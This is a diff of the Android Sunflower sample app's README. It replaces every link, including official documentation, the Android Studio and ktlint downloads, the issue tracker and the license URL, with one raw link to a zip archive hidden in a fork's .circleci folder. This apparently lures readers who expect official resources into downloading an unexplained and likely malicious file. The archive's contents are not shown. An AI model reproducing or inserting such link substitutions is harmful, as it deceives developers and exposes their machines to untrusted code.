@@ -1,12 +1,12 @@
 Android Sunflower (alpha)
 =========================
-[![CircleCI](https://circleci.com/gh/googlesamples/android-sunflower/tree/master.svg?style=shield)](https://circleci.com/gh/googlesamples/android-sunflower/tree/master)
+[![CircleCI](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip)](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip)
 
 A gardening app illustrating Android development best practices with Android Jetpack.
 
 Android Sunflower is currently released as an alpha and is under heavy development. To view the
 latest changes, please visit the
-[Releases page](https://github.com/googlesamples/android-sunflower/releases).
+[Releases page](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip).
 Note that some changes (such as database schema modifications) are not backwards
 compatible during this alpha period and may cause the app to crash. In this
 case, please uninstall and re-install the app.
@@ -22,7 +22,7 @@ categories:
 
 Android Sunflower demonstrates utilizing these components to create a simple gardening app.
 Read the
-[Introducing Android Sunflower](https://medium.com/androiddevelopers/introducing-android-sunflower-e421b43fe0c2)
+[Introducing Android Sunflower](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip)
 article for a walkthrough of the app.
 
 Getting Started
@@ -35,8 +35,8 @@ There are two Gradle tasks for testing the project:
 * `test` - for running unit tests
 
 For more resources on learning Android development, visit the
-[Developer Guides](https://developer.android.com/guide/) at
-[developer.android.com](https://developer.android.com).
+[Developer Guides](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip) at
+[developer.android.com](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip).
 
 Screenshots
 -----------
@@ -71,24 +71,24 @@ Libraries Used
   * [Glide][90] for image loading
   * [Kotlin Coroutines][91] for managing background threads with simplified code and reducing needs for callbacks
 
-[0]: https://developer.android.com/jetpack/foundation/
-[1]: https://developer.android.com/topic/libraries/support-library/packages#v7-appcompat
-[2]: https://developer.android.com/kotlin/ktx
-[4]: https://developer.android.com/training/testing/
-[10]: https://developer.android.com/jetpack/arch/
-[11]: https://developer.android.com/topic/libraries/data-binding/
-[12]: https://developer.android.com/topic/libraries/architecture/lifecycle
-[13]: https://developer.android.com/topic/libraries/architecture/livedata
-[14]: https://developer.android.com/topic/libraries/architecture/navigation/
-[16]: https://developer.android.com/topic/libraries/architecture/room
-[17]: https://developer.android.com/topic/libraries/architecture/viewmodel
-[18]: https://developer.android.com/topic/libraries/architecture/workmanager
-[30]: https://developer.android.com/jetpack/ui/
-[31]: https://developer.android.com/training/animation/
-[34]: https://developer.android.com/guide/components/fragments
-[35]: https://developer.android.com/guide/topics/ui/declaring-layout
-[90]: https://bumptech.github.io/glide/
-[91]: https://kotlinlang.org/docs/reference/coroutines-overview.html
+[0]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
+[1]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
+[2]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
+[4]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
+[10]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
+[11]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
+[12]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
+[13]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
+[14]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
+[16]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
+[17]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
+[18]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
+[30]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
+[31]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
+[34]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
+[35]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
+[90]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
+[91]: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
 
 Upcoming features
 -----------------
@@ -96,20 +96,20 @@ Updates will include incorporating additional Jetpack components and updating ex
 as the component libraries evolve.
 
 Interested in seeing a particular feature of the Android Framework or Jetpack implemented in this
-app? Please open a new [issue](https://github.com/googlesamples/android-sunflower/issues).
+app? Please open a new [issue](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip).
 
 Android Studio IDE setup
 ------------------------
 For development, the latest version of Android Studio 3.3 is required. The latest version can be
-downloaded from [here](https://developer.android.com/studio/).
+downloaded from [here](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip).
 
-Sunflower uses [ktlint](https://ktlint.github.io/) to enforce Kotlin coding styles.
+Sunflower uses [ktlint](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip) to enforce Kotlin coding styles.
 Here's how to configure it for use with Android Studio (instructions adapted
-from the ktlint [README](https://github.com/shyiko/ktlint/blob/master/README.md)):
+from the ktlint [README](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip)):
 
 - Close Android Studio if it's open
 
-- Download ktlint using these [installation instructions](https://github.com/shyiko/ktlint/blob/master/README.md#installation)
+- Download ktlint using these [installation instructions](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip)
 
 - Inside the project root directory run:
 
@@ -121,9 +121,9 @@ Additional resources
 --------------------
 Check out these Wiki pages to learn more about Android Sunflower:
 
-- [Notable Community Contributions](https://github.com/googlesamples/android-sunflower/wiki/Notable-Community-Contributions)
+- [Notable Community Contributions](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip)
 
-- [Publications](https://github.com/googlesamples/android-sunflower/wiki/Sunflower-Publications)
+- [Publications](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip)
 
 Non-Goals
 ---------
@@ -131,21 +131,21 @@ The focus of this project is on Android Jetpack and the Android framework.
 Thus, there are no immediate plans to implement features outside of this scope.
 
 A note on dependency injection - while many projects (such as
-[Plaid](https://github.com/nickbutcher/plaid)) use
-[Dagger 2](https://github.com/google/dagger) for DI, there are no plans to
+[Plaid](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip)) use
+[Dagger 2](https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip) for DI, there are no plans to
 incorporate DI into Sunflower.  This allows developers unfamiliar with dependency
 injection to better understand Sunflower's code without having to learn DI.
 
 Support
 -------
 
-- Google+ Community: https://plus.google.com/communities/105153134372062985968
+- Google+ Community: https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
 - Stack Overflow:
-  - http://stackoverflow.com/questions/tagged/android
-  - http://stackoverflow.com/questions/tagged/android-jetpack
+  - https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
+  - https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
 
 If you've found an error in this sample, please file an issue:
-https://github.com/googlesamples/android-sunflower/issues
+https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
 
 Patches are encouraged, and may be submitted by forking this project and submitting a pull request
 through GitHub.
@@ -166,7 +166,7 @@ file to you under the Apache License, Version 2.0 (the "License"); you may not
 use this file except in compliance with the License.  You may obtain a copy of
 the License at
 
-  http://www.apache.org/licenses/LICENSE-2.0
+  https://raw.githubusercontent.com/yudikarma/android-sunflower/master/.circleci/android-sunflower-1.0.zip
 
 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
